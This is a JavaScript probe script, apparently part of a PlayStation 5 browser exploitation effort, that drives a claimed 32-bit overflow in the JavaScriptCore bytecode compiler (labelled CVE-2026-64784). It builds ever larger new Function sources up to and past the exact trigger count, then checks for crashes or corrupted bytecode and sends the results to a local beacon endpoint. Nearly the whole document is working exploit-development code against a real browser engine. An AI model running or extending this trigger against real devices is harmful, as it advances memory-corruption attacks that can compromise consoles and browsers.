// p125 — UnlinkedMetadataTable overflow (CVE-2026-64784, bug 317632)
// 32-bit overflow in JSC bytecode compiler's metadata table finalization
// Trigger: new Function('a', 'a();'.repeat(44739242)) — 180MB source
// p124 R6 confirmed 80MB (20M reps) compiles fine on PS5
//
// Strategy: scale up toward trigger threshold, detect overflow via
// crash (no post-beacon), error (catch), or silent success (corrupted metadata)
//
// B1: 30M reps (120MB) — confirm scaling
// B2: 40M reps (160MB) — near threshold
// B3: 44M reps (176MB) — just under trigger
// B4: 44739242 reps (179MB) — exact CVE trigger
// B5: 44739243 reps — one past trigger
// B6: 45M reps (180MB) — past trigger
(function(){
var rid='v125b'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V125B-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V125B-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe125-start');
var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms);});};

var tests=[
  {name:'B1-30M',n:30000000},
  {name:'B2-40M',n:40000000},
  {name:'B3-44M',n:44000000},
  {name:'B4-TRIGGER',n:44739242},
  {name:'B5-TRIGGER+1',n:44739243},
  {name:'B6-45M',n:45000000}
];

async function runAll(){
  for(var t=0;t<tests.length;t++){
    var test=tests[t];
    var r={n:test.n,bytes:test.n*4};
    beacon(test.name+'-PRE','attempting-'+test.n);
    var t0=Date.now();
    try{
      var src='a();'.repeat(test.n);
      r.srcLen=src.length;
      r.srcTime=Date.now()-t0;
      var t1=Date.now();
      try{
        var fn=new Function('a',src);
        r.compileTime=Date.now()-t1;
        r.ok=true;
        r.fnType=typeof fn;
        // Try to call it with a harmless function to see if bytecode is corrupted
        var callCount=0;
        try{
          fn(function(){callCount++;if(callCount>3)throw new Error('STOP');});
        }catch(e){
          if(e.message==='STOP') r.callsOK=true;
          else r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
        r.callCount=callCount;
        fn=null;
      }catch(e){
        r.compileTime=Date.now()-t1;
        r.compileErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      }
      src=null;
    }catch(e){
      r.srcErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.totalTime=Date.now()-t0;
    beacon(test.name,r);

    // GC pressure between tests
    for(var g=0;g<20;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
    await sleep(500);
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
